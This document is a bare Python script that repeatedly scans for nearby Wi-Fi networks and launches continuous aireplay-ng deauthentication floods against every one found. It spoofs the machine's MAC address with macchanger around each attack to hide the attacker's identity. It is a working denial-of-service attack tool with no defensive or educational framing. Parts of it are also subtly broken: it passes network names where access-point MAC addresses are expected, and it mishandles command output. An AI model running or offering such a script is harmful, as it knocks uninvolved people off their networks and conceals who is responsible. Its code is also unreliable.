import subprocess
import time
import random

def random_mac():
    return ":".join([hex(random.randint(0x00, 0xff))[2:].zfill(2) for _ in range(6)])

while True:
    try:
        output = subprocess.check_output(['iwlist', 'wlan0', 'scan'])
        networks = [line.split(':')[1] for line in output.split('\n') if 'ESSID' in line]
        for network in networks:
            subprocess.call(['iwconfig', 'wlan0', 'mode', 'monitor'])
            subprocess.call(['ifconfig', 'wlan0', 'down'])
            subprocess.call(['macchanger', '-m', random_mac(), 'wlan0'])
            subprocess.call(['ifconfig', 'wlan0', 'up'])
            subprocess.call(['aireplay-ng', '-0', '0', '-a', network.strip(), '-c', 'FF:FF:FF:FF:FF:FF', 'wlan0'])
            subprocess.call(['iwconfig', 'wlan0', 'mode', 'managed'])
            subprocess.call(['ifconfig', 'wlan0', 'down'])
            subprocess.call(['macchanger', '-p', 'wlan0'])
            subprocess.call(['ifconfig', 'wlan0', 'up'])
        time.sleep(1)
    except KeyboardInterrupt:
        break
